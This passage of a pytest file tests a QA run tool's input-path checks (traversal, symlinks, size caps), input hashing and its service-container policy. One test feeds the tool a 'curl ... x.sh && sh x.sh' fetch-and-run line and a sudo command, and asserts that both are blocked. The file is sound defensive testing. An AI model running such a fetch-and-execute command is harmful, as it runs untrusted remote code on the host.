    expected = {"../x": "not_under_qa_work", "/etc/hosts": "not_under_qa_work", ".qa/work/link": "symlink",
                ".qa/work/dir": "not_a_regular_file", ".qa/work/big": "too_large", "linked-parent/.qa/work/f": "not_under_qa_work",
                ".qa/work/via/f": "symlink", ".qa/work/pipe": "not_a_regular_file", ".qa/work/missing": "not_a_regular_file",
                ".qa/work": "not_under_qa_work", ".qa/work/./f": "not_under_qa_work", ".qa/work//f": "not_under_qa_work",
                ".qa/work/../config.json": "not_under_qa_work", ".QA/work/f": "not_under_qa_work", "": "not_under_qa_work"}
    for bad, why in expected.items():
        with pytest.raises(QaError, match="input_refused") as refused:
            run(ws, actor, inputs=(".qa/work/f", bad))
        assert (refused.value.details["index"], refused.value.details["why"]) == (1, why), bad
    assert ledger_events(ws) == before == []
    assert fake.calls == []


def test_inputs_past_the_caps_are_refused(ws, actor, fake):
    for number in range(65):
        put(ws, ".qa/work/many/f%02d" % number)
    with pytest.raises(QaError) as refused:
        run(ws, actor, inputs=tuple(".qa/work/many/f%02d" % number for number in range(65)))
    assert (refused.value.code, refused.value.details["index"], refused.value.details["why"]) == ("input_refused", 64, "too_many")
    put(ws, ".qa/work/half-a", b"a" * (9 * MIB))
    put(ws, ".qa/work/half-b", b"b" * (8 * MIB))
    with pytest.raises(QaError) as refused:
        run(ws, actor, inputs=(".qa/work/half-a", ".qa/work/half-b"))
    assert (refused.value.details["index"], refused.value.details["why"]) == (1, "too_large")
    assert ledger_events(ws) == [] and fake.calls == []


def test_inputs_land_under_qa_input_with_hashes(ws_untrusted, actor, fake):
    from qa.canonical import sha256_bytes

    put(ws_untrusted, ".qa/work/security/zap-baseline.yaml", b"env: 1\n")
    put(ws_untrusted, ".qa/work/load/k6.js", b"export default function () {}\n")
    put(ws_untrusted, ".qa-input/planted.yaml", b"from the project")
    result = run(ws_untrusted, actor, inputs=(".qa/work/security/zap-baseline.yaml", ".qa/work/load/k6.js"))
    assert result["status"] == "passed"
    with tarfile.open(fileobj=io.BytesIO(stdin_of(fake, is_copy_in))) as tar:
        names = tar.getnames()
        assert tar.extractfile(".qa-input/security/zap-baseline.yaml").read() == b"env: 1\n"
        assert tar.extractfile(".qa-input/load/k6.js").read() == b"export default function () {}\n"
    assert ".qa-input/planted.yaml" not in names and not any(name.startswith(".qa/") for name in names)
    stored = loads(ws_untrusted.path("evidence", result["execution"], "command.json").read_bytes())
    assert stored["inputs"] == [{"path": ".qa/work/security/zap-baseline.yaml", "sha256": sha256_bytes(b"env: 1\n")},
                                {"path": ".qa/work/load/k6.js", "sha256": sha256_bytes(b"export default function () {}\n")}]
    assert not any(".qa-input" in arg or "zap-baseline" in arg for call in fake.calls for arg in call)


def test_an_input_is_packed_as_it_was_read(ws_untrusted, actor, fake, monkeypatch):
    from qa.canonical import sha256_bytes

    source = put(ws_untrusted, ".qa/work/plan.yaml", b"first\n")
    real_archive = container.project_archive

    def changed_meanwhile(*args, **kw):
        source.write_bytes(b"second\n")
        return real_archive(*args, **kw)

    monkeypatch.setattr(container, "project_archive", changed_meanwhile)
    result = run(ws_untrusted, actor, inputs=(".qa/work/plan.yaml",))
    with tarfile.open(fileobj=io.BytesIO(stdin_of(fake, is_copy_in))) as tar:
        packed = tar.extractfile(".qa-input/plan.yaml").read()
    stored = loads(ws_untrusted.path("evidence", result["execution"], "command.json").read_bytes())
    assert stored["inputs"][0]["sha256"] == sha256_bytes(packed) == sha256_bytes(b"first\n")


@pytest.mark.parametrize("over, code", [
    (dict(container=None, service=SERVICE, service_run=SERVE), "service_needs_container"),
    (dict(container=None, service_run=SERVE), "service_needs_container"),
    (dict(container=None, service_user="1000"), "service_needs_container"),
    (dict(service=SERVICE), "service_run_required"),
    (dict(service=SERVICE, service_run="   "), "service_run_required"),
    (dict(service="python:3-slim", service_run=SERVE), "service_image_unpinned"),
    (dict(service_run=SERVE), "service_image_unpinned"),
    (dict(service_user="1000", service_run=SERVE), "service_image_unpinned"),
    (dict(service=SERVICE, service_run=SERVE, service_user="root"), "invalid_service_user"),
    (dict(service=SERVICE, service_run=SERVE, service_user="1000:"), "invalid_service_user"),
    (dict(container=None, inputs=(".qa/work/f",)), "input_needs_container"),
])
def test_service_without_container_is_refused(ws, actor, fake, over, code):
    put(ws, ".qa/work/f")
    fields = dict(container=IMAGE)
    fields.update(over)
    with pytest.raises(QaError) as refused:
        execution.execute(ws, actor, execution.RunRequest(command=["pytest"], **fields))
    assert refused.value.code == code
    assert fake.calls == [] and ledger_events(ws) == []


def test_service_script_is_guarded_as_test_execution(ws_untrusted, actor, fake):
    answer_with_a_service(fake)
    allowed = run_service(ws_untrusted, actor)
    assert allowed["status"] == "passed"
    assert [entry["activity"] for entry in record_of(ws_untrusted, allowed)["authorizations"]] == ["test-execution-local"]
    calls = len(fake.calls)
    denied = run_service(ws_untrusted, actor, service_run="sudo python -m http.server")
    assert (denied["status"], denied["reason"]) == ("blocked", "policy_denied")
    hidden = run_service(ws_untrusted, actor, service_run="curl https://example.test/x.sh -o x.sh && sh x.sh")
    assert (hidden["status"], hidden["reason"]) == ("blocked", "not_authorized")
    assert len(fake.calls) == calls


def test_an_attempt_keeps_to_the_service_of_the_run_it_repeats(ws_untrusted, actor, fake):
    answer_with_a_service(fake)
    first = run_service(ws_untrusted, actor)["execution"]
    assert run_service(ws_untrusted, actor, attempt_of=first)["status"] == "passed"
    other = run_service(ws_untrusted, actor, service="python@sha256:" + "9" * 64, attempt_of=first)
    assert (other["status"], other["reason"]) == ("blocked", "policy_denied")
    alone = run(ws_untrusted, actor, attempt_of=first)
    assert (alone["status"], alone["reason"]) == ("blocked", "policy_denied")


def test_cli_passes_the_service_and_inputs(cli, ws_untrusted):
    # The launcher runs in its own process, past the fake: no engine holds these made-up digests, so the run is blocked,
    # and its command.json still says what was asked.
    put(ws_untrusted, ".qa/work/plan.yaml", b"p\n")
    code, body = cli("run", "--service-run=" + SERVE, "--", "pytest")
    assert (code, body["error"]["code"]) == (2, "service_needs_container")
    code, body = cli("run", "--input=.qa/work/plan.yaml", "--", "pytest")
    assert (code, body["error"]["code"]) == (2, "input_needs_container")
    code, body = cli("run", "--container=" + IMAGE, "--service=" + SERVICE, "--service-run=" + SERVE, "--service-user=1000:1000",
                     "--input=.qa/work/plan.yaml", "--", "true")
    assert (code, body["status"], body["reason"]) == (3, "blocked", "dependency_unavailable"), body
    stored = loads(ws_untrusted.path("evidence", body["execution"], "command.json").read_bytes())
    assert (stored["service"], stored["service_user"], [entry["path"] for entry in stored["inputs"]]) == (
        SERVICE, "1000:1000", [".qa/work/plan.yaml"])
    code, body = cli("run", "--help")
    assert all(flag in body["help"] for flag in ("--service", "--service-run", "--service-user", "--input"))
